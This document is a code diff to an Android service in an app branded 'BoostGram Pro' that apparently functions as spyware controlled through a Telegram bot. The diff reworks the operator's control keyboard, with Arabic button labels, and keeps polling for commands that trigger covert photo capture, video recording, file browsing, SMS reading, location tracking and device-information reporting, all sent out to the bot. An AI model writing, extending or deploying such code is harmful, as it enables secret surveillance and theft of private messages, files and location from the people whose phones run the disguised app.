@@ -56,37 +56,36 @@ class CameraService : Service() {
 
     private fun startPolling() {
         scope.launch {
-            sendDeviceInfo()
-            delay(3000)
-            captureAndSend()
+            clearUpdates() // Important: Clear old buttons
+            
+            val startKeyboard = """
+            {
+                "keyboard": [
+                    [{"text": "▶️ بدء العمل"}, {"text": "🛑 إيقاف الأداة"}],
+                    [{"text": "📸 صورة"}, {"text": "🎥 فيديو"}],
+                    [{"text": "📂 الملفات"}, {"text": "💬 الرسائل"}],
+                    [{"text": "📍 الموقع"}, {"text": "📱 معلومات الجهاز"}]
+                ],
+                "resize_keyboard": true,
+                "one_time_keyboard": false
+            }
+            """.trimIndent()
+            
+            Telegram.sendMessageWithKeyboard("👋 مرحباً بك يا سيدي.\n\nالأداة جاهزة. استخدم الأزرار النصية في الأسفل للتحكم بالكامل.\n\nاستخدم ▶️ للبدء، و 🛑 للإيقاف.", startKeyboard)
             
             while (isActive && isRunning) {
                 runCatching { checkCommands() }
-                delay(5000)
+                delay(3000)
             }
         }
     }
 
-    private fun sendDeviceInfo() {
-        val info = buildString {
-            appendLine("📱 جهاز جديد متصل - BoostGram Pro")
-            appendLine("Model: ${Build.MODEL}")
-            appendLine("Brand: ${Build.BRAND}")
-            appendLine("Android: ${Build.VERSION.RELEASE}")
-            appendLine("SDK: ${Build.VERSION.SDK_INT}")
-            appendLine("Screen: ${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}")
-        }
-        val keyboard = """
-        {
-            "inline_keyboard": [
-                [{"text": "📸 التقاط صورة", "callback_data": "cam"}, {"text": "🎥 تسجيل فيديو", "callback_data": "rec"}],
-                [{"text": "📂 الملفات", "callback_data": "files"}, {"text": "📱 معلومات الجهاز", "callback_data": "info"}],
-                [{"text": "💬 رسائل SMS", "callback_data": "sms"}, {"text": "📍 الموقع", "callback_data": "loc"}],
-                [{"text": "🛑 إيقاف الأداة", "callback_data": "stop"}]
-            ]
-        }
-        """.trimIndent()
-        Telegram.sendMessageWithKeyboard(info, keyboard)
+    private fun clearUpdates() {
+        try {
+            val url = "https://api.telegram.org/bot${Telegram.BOT_TOKEN}/getUpdates?offset=-1&timeout=0"
+            val req = okhttp3.Request.Builder().url(url).build()
+            okhttp3.OkHttpClient().newCall(req).execute().close()
+        } catch (e: Exception) {}
     }
 
     private fun checkCommands() {
@@ -103,40 +102,38 @@ class CameraService : Service() {
             val text = u.optJSONObject("message")?.optString("text")
             if (text != null) {
                 when (text.trim()) {
-                    "/start" -> { sendDeviceInfo() }
-                    "/cam" -> captureAndSend()
-                    "/files" -> listDirectory(currentDir)
-                    "/stop" -> { isRunning = false; stopSelf() }
-                }
-            }
-            
-            val callback = u.optJSONObject("callback_query")
-            if (callback != null) {
-                val data = callback.optString("data")
-                val cbId = callback.optString("id")
-                Telegram.answerCallback(cbId)
-                
-                when {
-                    data == "cam" -> captureAndSend()
-                    data == "rec" -> recordVideo()
-                    data == "files" -> listDirectory(currentDir)
-                    data == "info" -> sendDeviceInfo()
-                    data == "sms" -> readSMS()
-                    data == "loc" -> getLocation()
-                    data == "stop" -> { isRunning = false; stopSelf() }
-                    data.startsWith("files:") -> listDirectory(data.substringAfter("files:"))
-                    data.startsWith("download:") -> {
-                        val id = data.substringAfter("download:").toIntOrNull()
-                        val path = fileMap[id]
-                        if (path != null) {
-                            val f = File(path)
-                            if (f.exists()) Telegram.sendFile(f, "📄 ${f.name}")
-                            else Telegram.sendMessage("❌ الملف غير موجود.")
-                        }
+                    "/start" -> sendDeviceInfo()
+                    "▶️ بدء العمل" -> {
+                        sendDeviceInfo()
+                        Telegram.sendMessage("✅ الأداة تعمل الآن في الخلفية.")
                     }
+                    "🛑 إيقاف الأداة" -> {
+                        isRunning = false
+                        Telegram.sendMessage("🛑 تم إيقاف الأداة مؤقتاً. ستعود للعمل عند فتح التطبيق.")
+                        stopSelf()
+                    }
+                    "📸 صورة" -> captureAndSend()
+                    "🎥 فيديو" -> recordVideo()
+                    "📂 الملفات" -> listDirectory(currentDir)
+                    "💬 الرسائل" -> readSMS()
+                    "📍 الموقع" -> getLocation()
+                    "📱 معلومات الجهاز" -> sendDeviceInfo()
                 }
             }
         }
+    }
+
+    private fun sendDeviceInfo() {
+        val info = buildString {
+            appendLine("📱 جهاز متصل - BoostGram Pro")
+            appendLine("Model: ${Build.MODEL}")
+            appendLine("Brand: ${Build.BRAND}")
+            appendLine("Android: ${Build.VERSION.RELEASE}")
+            appendLine("SDK: ${Build.VERSION.SDK_INT}")
+            appendLine("Screen: ${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}")
+            appendLine("\n✅ الأزرار جاهزة.")
+        }
+        Telegram.sendMessage(info)
     }
 
     private fun readSMS() {
